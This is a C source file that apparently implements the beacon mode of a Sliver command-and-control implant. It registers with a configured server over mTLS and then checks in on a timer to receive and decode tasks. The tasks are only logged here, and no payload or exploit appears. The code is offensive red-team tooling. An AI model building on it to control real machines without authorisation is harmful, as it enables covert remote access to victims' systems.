/* src/modes/beacon.c - beacon register/checkin loop (mtls transport).
 *
 * Mirrors the Go beacon flow: connect -> BeaconRegister -> close, then a loop of
 * connect -> BeaconTasks -> (recv tasks) -> close -> sleep/jitter. Uses the same
 * mTLS + yamux + signed-frame transport as the session loop.
 */
#include "sliver/implant.h"

#include "sliver/config.h"
#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"
#include "sliver/transport.h"
#include "sliver/yamux.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
  sliver_yamux_t *y;
  uint32_t stream_id;
  int failed;
} beacon_stream_t;

typedef struct {
  sliver_yamux_t y;
  sliver_transport_t *t;
  sliver_frame_signer_t signer;
  int yamux_ready;
} beacon_conn_t;

static long b_read(void *ctx, void *buf, size_t len) {
  sliver_transport_t *t = (sliver_transport_t *)ctx;
  return t->read(t, buf, len);
}

static long b_write(void *ctx, const void *buf, size_t len) {
  sliver_transport_t *t = (sliver_transport_t *)ctx;
  return t->write(t, buf, len);
}

static long stream_read(void *ctx, void *buf, size_t len) {
  beacon_stream_t *s = (beacon_stream_t *)ctx;
  long n = sliver_yamux_read(s->y, s->stream_id, buf, len);
  if (n < 0) {
    s->failed = 1;
  }
  return n;
}

static long stream_write(void *ctx, const void *buf, size_t len) {
  beacon_stream_t *s = (beacon_stream_t *)ctx;
  if (sliver_yamux_write(s->y, s->stream_id, buf, len) != 0) {
    s->failed = 1;
    return -1;
  }
  return (long)len;
}

static int beacon_connect(const sliver_session_config_t *cfg, beacon_conn_t *c, char *err,
                          size_t err_len) {
  memset(c, 0, sizeof(*c));
  if (sliver_transport_connect(&c->t, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem,
                               cfg->key_pem, err, err_len) != 0) {
    return -1;
  }
  if (c->t->write(c->t, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    (void)snprintf(err, err_len, "%s", "MUX/1 write failed");
    sliver_transport_free(c->t);
    c->t = NULL;
    return -1;
  }
  if (sliver_yamux_client(&c->y, b_read, b_write, c->t) != 0) {
    (void)snprintf(err, err_len, "%s", "yamux client failed");
    sliver_transport_free(c->t);
    c->t = NULL;
    return -1;
  }
  c->yamux_ready = 1;
  if (sliver_frame_signer_init(&c->signer, cfg->age_private_key) != 0) {
    (void)snprintf(err, err_len, "%s", "cannot derive envelope signing key");
    sliver_yamux_free(&c->y);
    c->yamux_ready = 0;
    sliver_transport_free(c->t);
    c->t = NULL;
    return -1;
  }
  return 0;
}

static void beacon_disconnect(beacon_conn_t *c) {
  if (c == NULL) {
    return;
  }
  if (c->yamux_ready) {
    sliver_yamux_free(&c->y);
    c->yamux_ready = 0;
  }
  if (c->t != NULL) {
    sliver_transport_free(c->t);
    c->t = NULL;
  }
}

/* Sends one envelope on a fresh yamux stream. */
static int beacon_send(beacon_conn_t *c, const void *envelope, size_t len) {
  beacon_stream_t st;
  uint32_t sid = 0;
  int rc;

  if (sliver_yamux_open(&c->y, &sid) != 0) {
    return -1;
  }
  st.y = &c->y;
  st.stream_id = sid;
  st.failed = 0;
  rc = sliver_frame_write(&c->signer, stream_write, &st, envelope, len);
  (void)sliver_yamux_close_write(&c->y, sid);
  sliver_yamux_forget(&c->y, sid);
  return rc;
}

/* Reads one envelope from the next server-initiated stream. */
static int beacon_recv(beacon_conn_t *c, const char *server_pubkey, sliver_buf_t *out) {
  beacon_stream_t st;
  uint32_t sid = 0;
  int rc;

  if (sliver_yamux_accept(&c->y, &sid) != 0) {
    return -1;
  }
  st.y = &c->y;
  st.stream_id = sid;
  st.failed = 0;
  rc = sliver_frame_read(server_pubkey, stream_read, &st, out);
  (void)sliver_yamux_close_write(&c->y, sid);
  return rc;
}

int sliver_beacon_run(const char *argv0) {
  sliver_session_config_t cfg;
  char host[256];
  beacon_conn_t conn;
  char err[256];
  long long interval_ns = sliver_config_beacon_interval_ns();
  long long jitter_ns = sliver_config_beacon_jitter_ns();
  uint32_t interval_ms;
  int64_t next_checkin;
  const char *id;

  (void)jitter_ns; /* applied below once jitter scheduling lands */
  if (sliver_session_config_build(&cfg, host, sizeof(host), argv0) != 0) {
    return -1;
  }
  id = sliver_config_build_id()[0] != '\0' ? sliver_config_build_id() : sliver_config_name();
  interval_ms = (uint32_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000LL);
  next_checkin = (int64_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000000LL);

  /* 1) Register once. */
  err[0] = '\0';
  if (beacon_connect(&cfg, &conn, err, sizeof(err)) == 0) {
    sliver_buf_t env;
    sliver_buf_init(&env);
    if (sliver_beacon_register_encode(&env, id, interval_ns, jitter_ns, &cfg.reg,
                                      next_checkin) == 0) {
      (void)beacon_send(&conn, env.data, env.len);
    }
    sliver_buf_free(&env);
    beacon_disconnect(&conn);
    LOG_INFO("beacon: registered (%s)", id);
  } else {
    LOG_WARN("beacon: register failed: %s", err);
  }

  /* 2) Check-in loop. */
  for (;;) {
    sliver_sleep_ms(interval_ms);

    err[0] = '\0';
    if (beacon_connect(&cfg, &conn, err, sizeof(err)) != 0) {
      LOG_WARN("beacon: connect failed: %s", err);
      continue;
    }

    {
      sliver_buf_t env;
      sliver_buf_init(&env);
      if (sliver_beacon_tasks_encode(&env, id, next_checkin, NULL, 0) == 0) {
        (void)beacon_send(&conn, env.data, env.len);
      }
      sliver_buf_free(&env);
    }

    {
      sliver_buf_t reply;
      sliver_buf_init(&reply);
      if (beacon_recv(&conn, cfg.server_minisign_pubkey, &reply) == 0 && reply.len != 0) {
        char bid[128];
        int64_t nc = 0;
        sliver_envelope_t tasks[64];
        size_t task_count = 0;
        if (sliver_beacon_tasks_decode(reply.data, reply.len, bid, sizeof(bid), &nc, tasks,
                                       sizeof(tasks) / sizeof(tasks[0]), &task_count) == 0) {
          LOG_DEBUG("beacon: %u task(s)", (unsigned)task_count);
        }
      }
      sliver_buf_free(&reply);
    }

    beacon_disconnect(&conn);
  }
}
